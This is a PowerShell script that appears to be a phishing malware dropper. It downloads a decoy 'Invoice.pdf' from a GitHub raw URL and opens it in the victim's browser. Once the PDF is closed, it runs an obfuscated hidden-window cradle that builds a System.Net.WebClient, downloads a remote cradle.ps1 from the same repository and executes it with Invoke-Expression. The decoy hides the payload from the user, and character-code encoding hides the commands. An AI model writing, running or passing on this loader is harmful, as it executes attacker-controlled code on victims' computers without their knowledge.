$pdfUrl  = "https://raw.githubusercontent.com/Brothersextremegaming/pwshcradle/refs/heads/main/Invoice.pdf"
$pdfPath = Join-Path ([Environment]::GetFolderPath("MyDocuments")) "file.pdf"

$browserPaths = @(
    "C:\Program Files\Google\Chrome\Application\chrome.exe",
    "C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
    "C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
    "C:\Program Files\Opera\opera.exe",
    "C:\Program Files\Opera GX\opera.exe",
    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    "C:\Program Files\Mozilla Firefox\firefox.exe"
)

$browserProcessNames = @(
    "chrome",
    "brave",
    "opera",
    "msedge",
    "firefox"
)
powershell -NoP -sta -NonI -W Hidden

Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -ErrorAction SilentlyContinue

$browser = $browserPaths | Where-Object { Test-Path $_ } | Select-Object -First 1

if ($browser) {
    Start-Process -FilePath $browser -ArgumentList "`"$pdfPath`"" -ErrorAction SilentlyContinue
} else {
    Start-Process $pdfPath -ErrorAction SilentlyContinue
}

function Get-PDFRenderer {
    $procs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue
    $procs | Where-Object {
        $name = $_.Name -replace "\.exe$", ""
        ($browserProcessNames -contains $name) -and
        ($_.CommandLine -match "\.pdf")
    } | Select-Object ProcessId, Name, CommandLine
}

do {
    $pdfProcesses = Get-PDFRenderer
    if ($pdfProcesses) {
        Start-Sleep -Seconds 1
    }
} while ($pdfProcesses)

powershell -NoP -sta -NonI -W Hidden -enc
$k14UguaB6lp = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{$_}|ForEach-Object{$_}|%{ ( [char][int] $_)})) |%{$_}|ForEach-Object{$_}| % {$_}) $([char](10+83-10)+[char](0+121-0)+[char](36*115/36)+[char](109+116-109)+[char](8*101/8)+[char](0+109-0)+[char](0+46-0)+[char](57+78-57)+[char](47*101/47)+[char](41*116/41)+[char](0+46-0)+[char](0+87-0)+[char](82+101-82)+[char](17+98-17)+[char](68+67-68)+[char](0+108-0)+[char](18*105/18)+[char](100+101-100)+[char](0+110-0)+[char](37*116/37)); $DownloadPathh = ([string]::join('', ( (104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,66,114,111,116,104,101,114,115,101,120,116,114,101,109,101,103,97,109,105,110,103,47,112,119,115,104,99,114,97,100,108,101,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,99,114,97,100,108,101,46,112,115,49) |%{$_}|ForEach-Object{$_}|%{ ( [char][int] $_)})) |%{$_}|ForEach-Object{$_}| % {$_}); $k14UguaB6lp.DownloadString($DownloadPathh) |%{$_}|ForEach-Object{$_}| & ([string]::join('', ( (73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110) |%{$_}|ForEach-Object{$_}|%{ ( [char][int] $_)})) |%{$_}|ForEach-Object{$_}| % {$_})

